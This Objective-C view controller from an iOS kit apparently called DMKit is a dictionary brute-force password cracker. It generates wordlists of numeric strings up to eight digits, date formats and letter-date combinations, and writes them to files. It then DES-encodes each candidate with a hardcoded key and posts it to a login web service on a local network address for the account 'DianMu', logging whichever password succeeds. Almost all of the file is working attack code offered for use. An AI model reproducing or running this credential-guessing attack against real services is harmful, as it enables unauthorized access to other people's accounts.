//
//  PwdDictVC.m
//  DMKit
//
//  Created by 西安旺豆电子信息有限公司 on 2018/3/28.
//  Copyright © 2018年 呆木出品. All rights reserved.
//

#import "PwdDictVC.h"
#import "JoDes.h"

@interface PwdDictVC ()

@property (nonatomic , strong) NSMutableArray *dateDatas;

@property (nonatomic , strong) NSArray *abcDatas;
@property (nonatomic , copy) NSArray *abcResultDatas;


@property (nonatomic , strong) NSArray *sendDatas;



@property (nonatomic , assign) NSInteger allCount;
@property (nonatomic , assign) NSInteger oldIndex;
@property (nonatomic , assign) NSInteger currentIndex;
@property (nonatomic , assign) CGFloat progress;
@property (nonatomic , assign) CGFloat remainTime;
@property (nonatomic , assign) CGFloat usedTime;

@property (nonatomic , strong) NSDate *start;





@property (nonatomic , strong) UILabel *stateLab;

@property (nonatomic , strong) CADisplayLink *link;




@end

@implementation PwdDictVC

- (void)viewDidLoad {
    [super viewDidLoad];
    
    
    UIButton *btn1 = [UIButton new];
    [btn1 setTitle:@"Start" forState:UIControlStateNormal];
    [btn1 setTitleColor:[UIColor blueColor] forState:UIControlStateNormal];
    btn1.frame = CGRectMake(50, 100, 150, 50);
    [btn1 addTarget:self action:@selector(clickBtn1) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn1];

    
    _stateLab = [UILabel new];
    [self.view addSubview:_stateLab];
    _stateLab.textColor = [UIColor greenColor];
    _stateLab.numberOfLines = 0;
    
    
    [_stateLab mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.right.mas_equalTo(0);
        make.centerY.mas_equalTo(0);
    }];
    
    _stateLab.text = @"1111";
    
    
    
    
    
    _dateDatas = [NSMutableArray array];
    
    //_abcDatas = @[@"a",@"b",@"c",@"d",@"e",@"f",@"g",@"h",@"i",@"j",@"k",@"l",@"m",@"n",@"o",@"p",@"q",@"r",@"s",@"t",@"u",@"v",@"w",@"x",@"y",@"z",@"A",@"B",@"C",@"D",@"E",@"F",@"G",@"H",@"I",@"J",@"K",@"L",@"M",@"N",@"O",@"P",@"Q",@"R",@"S",@"T",@"U",@"V",@"W",@"X",@"Y",@"Z"];
    
    _abcDatas = @[@"0",@"1",@"2",@"3",@"4",@"5",@"6",@"7",@"8",@"9",];
    
    [self createLink];
}

- (void)clickBtn1
{
    /////////////////////
//    WeakObj(self);
//    BACK(^{
//        [selfWeak createAbcAddDate];
//    });
    ////////////////////
    
    
    
    
    /////////////////////
    NSString *dateStr = [NSString stringWithContentsOfFile:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/WordList/num/Allnum06_1000000.txt" encoding:NSUTF8StringEncoding error:nil];
    _sendDatas = [dateStr componentsSeparatedByString:@"\n"];

    _start = [NSDate date];
    _allCount = _sendDatas.count;

    [self send];
    ////////////////////
    
    
    
//    WeakObj(self);
//
//    BACK(^{
//        [selfWeak createAbcFiles];
//    });
//
}

- (void)send
{
    if (_currentIndex < _sendDatas.count) {
        @autoreleasepool{
        NSString *tmp = _sendDatas[_currentIndex];
        NSString *pwd = [JoDes encode:tmp key:@"22972820"];
        [self sendPwd:pwd];
        _currentIndex++;
        }
    }
}





- (void)sendPwd:(NSString *)pwd
{
    @autoreleasepool{
    NSDictionary *para = @{
                           @"UserAccount":@"DianMu",
                           @"Password":pwd
                           };
    
    NSString *url = @"http://192.168.100.201:92/UserService.svc/ILogin";
    WeakObj(self);
    [DMTools postWithUrl:url para:para success:^(id responseObject) {
        if ([responseObject[@"UserAccount"] isEqualToString:@"error"] ) {
            [selfWeak send];
        } else {
            NSLog(@"密码:%@",pwd);
        }
    } failure:^(NSError *error) {
        NSLog(@"%@",error);
        [selfWeak send];
    }];
    }
}








#pragma mark - link

- (void)createLink
{
    __weak typeof(self) weakSelf = self;
    _link = [CADisplayLink displayLinkWithTarget:weakSelf selector:@selector(linkAction:)];
    [_link addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];
}

- (void)linkAction:(CADisplayLink *)link
{
    if (_oldIndex != _currentIndex) {
        double time = [_start timeIntervalSinceNow];
        time = -time;
        _usedTime = time;
        
        _progress = (CGFloat)_currentIndex/_allCount * 100;
        
        _remainTime = time * 100 / _progress - time;
        _oldIndex = _currentIndex;
    }

    _stateLab.text = [NSString stringWithFormat:@"总计:%ld \n进行到:\t%ld---\t%.2f%%  \n预计剩余时间:\t%.2fs \n已用时间:\t%.2fs",_allCount,_currentIndex,_progress,_remainTime,_usedTime];
    
}






#pragma mark - abc3 + commonDate


- (void)createAbcAddDate
{
    NSLog(@"begin");
    _start = [NSDate date];
    
    NSString *abcStr = [NSString stringWithContentsOfFile:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/WordList/Allabc03_140608.txt" encoding:NSUTF8StringEncoding error:nil];
    NSString *dateStr = [NSString stringWithContentsOfFile:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/WordList/CommonDate_87660.txt" encoding:NSUTF8StringEncoding error:nil];
    
    NSArray *abcArray = [abcStr componentsSeparatedByString:@"\n"];
    NSArray *dateArray = [dateStr componentsSeparatedByString:@"\n"];
    
    NSString *path = @"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/abc2+cdate.txt";
    
    if (![DMTools fileExist:path]) {
        [@"" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
    NSFileHandle *file = [NSFileHandle fileHandleForUpdatingAtPath:path];
    
    _allCount = abcArray.count;
  
    
    NSMutableArray * muarray = [NSMutableArray array];
    for (int i = 0 ; i < abcArray.count; i++)
    {
        @autoreleasepool{
            NSString *str1 = abcArray[i];
            for (int j = 0 ;j < dateArray.count; j++)
            {
                NSString *str2 = dateArray[j];
                [muarray addObject:[NSString stringWithFormat:@"%@%@",str1,str2]];
            }
            NSLog(@"%d",i);
            _currentIndex = i+1;
            _progress = (CGFloat)(i+1)/abcArray.count * 100;
        
            NSString *result = [muarray componentsJoinedByString:@"\n"];
            [muarray removeAllObjects];
            [file seekToEndOfFile];
            [file writeData: [result dataUsingEncoding:NSUTF8StringEncoding]];
        }
    }
    
    [file closeFile];
    
    NSLog(@"end");
}



#pragma mark - abc

- (void)createAbcFiles
{
    NSLog(@"begin");
    long long count = 1;
    // 1...4
    while (count < 9) {
        [self createAbcResultDatas];
        
        NSLog(@"count: %ld",[_abcResultDatas count]);
        NSString *resultStr = [_abcResultDatas componentsJoinedByString:@"\n"];
        NSString *path = [NSString stringWithFormat:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/Allnum%02lld_%ld.txt",count,[_abcResultDatas count]] ;
        BOOL isOK = [resultStr writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
        NSLog(@"write : %d",isOK);
        count ++;
    }
    
    NSLog(@"end");
}

//前缀_上次结果   每运行一次,指数增长
- (void)createAbcResultDatas
{
    NSMutableArray * muarray = [NSMutableArray array];
    for (int i = 0 ; i < _abcDatas.count; i++)
    {
        NSString *str1 = _abcDatas[i];
        for (int j = 0 ;j < _abcResultDatas.count; j++)
        {
            NSString *str2 = _abcResultDatas[j];
            [muarray addObject:[NSString stringWithFormat:@"%@%@",str1,str2]];
        }
        if (_abcResultDatas.count == 0) {
            [muarray addObject:[NSString stringWithFormat:@"%@",str1]];
        }
    }
    _abcResultDatas = [muarray copy];
}








#pragma mark - Date

- (void)createAllDate
{
    NSLog(@"begin");
    long long count = 0;
    
    NSTimeInterval time = 0;
    
    NSDate *maxDate = [NSDate dateFromString:@"20300101" withFormat:@"yyyyMMdd"];
    NSTimeInterval maxTime = [maxDate timeIntervalSince1970];
    
    NSTimeInterval oneDay = 3600 * 24;
    
    while (time < maxTime) {
        NSDate *date = [NSDate dateWithTimeIntervalSince1970:time];
        
        [_dateDatas addObject:[date getStringWithFormat:@"yyMd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyMMdd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyyyMMdd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyyyMd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyyy.MM.dd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyyy-MM-dd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyyy/MM/dd"]];
        [_dateDatas addObject:[date getStringWithFormat:@"yyyy_MM_dd"]];
        
        time += oneDay;
        count ++;
    }
    
    NSLog(@"count: %lld",count);
    
    NSString *resultStr = [_dateDatas componentsJoinedByString:@"\n"];
    NSString *path = [NSString stringWithFormat:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/AllDate_%lld.txt",count * 8];
    
    BOOL isOK = [resultStr writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    NSLog(@"write : %d",isOK);
    
    NSLog(@"end");
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    NSLog(@"收到内存警告");
}

-(void)dealloc{
    MyLog(@" Game Over ... ");
    
    [_link invalidate];
}

@end
